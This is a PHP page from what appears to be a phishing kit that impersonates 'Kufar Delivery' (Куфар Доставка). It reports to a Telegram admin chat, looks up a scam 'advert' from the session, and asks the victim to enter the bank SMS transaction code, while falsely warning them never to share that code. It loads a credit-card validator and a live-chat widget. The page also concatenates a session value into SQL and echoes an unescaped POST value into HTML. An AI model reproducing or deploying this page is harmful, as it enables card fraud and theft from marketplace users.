<?php
include 'system/main.php';

if(!isset($_SESSION['adid']) || !isset($_SESSION['amount']) || !isset($_POST['invoiceID'])) {
    die("Сессия истекла.");
}

send('sendMessage', Array('chat_id' => $config['admins'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'random_id' => mt_rand()));

$query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `type` = '2' AND `advert_id` = '" . $_SESSION['adid'] . "' AND `status` = '1'");
if (mysqli_num_rows($query) > 0) {
    $order = mysqli_fetch_assoc($query);
} else header("Location: https://kufar.by");
?>
<html>
<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <title>Куфар Доставка</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="stylesheet" type="text/css"
          href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css"
          href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">

    <link rel="stylesheet" href="css/main.css">

</head>
<body>
<div class="container py-5">
    <div class="row">
        <div class="col-lg-7 mx-auto">
            <div id="not"></div>
            <p class="alert alert-warning">На Ваш телефон придёт смс с паролем транзакции.
                СМС приходит в течение 5 минут.
                Ни в коем случае не передавайте никому СМС код.</p>
            <div class="bg-white rounded-lg shadow-lg p-5">
                <div class="tab-content">
                    <div id="nav-tab-card" class="tab-pane fade show active">
                        <!--<form role="form" method="post">-->
                            <div class="form-group">
                                <label for="username">Код из СМС</label>
                                <input type="text" id="smscode" name="smscode" required=""
                                       class="form-control">
                            </div>


                            </div>
                            <?php echo '<button type="button" id="sendsms" onclick="sendSMSCode('. $_POST['invoiceID'] .')" class="subscribe btn btn-success btn-block shadow-sm">'; ?>
                                Подтвердить
                            </button>
                        <!--</form>-->
                    </div>

                </div>

            </div>
        </div>
    </div>
</div>

<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.min.js" integrity="sha256-+4KHeBj6I8jAKAU8xXRMXXlH+sqCvVCoK5GAFkmb+2I=" crossorigin="anonymous"></script>

<script src="js/jquery.creditCardValidator.js"></script>

<?php echo '<script type="text/javascript" src="js/main.js?'. time() .'"></script>' ?>

<script src="//code-ya.jivosite.com/widget/iSMjhlcZRL" async></script>

</body>
</html>
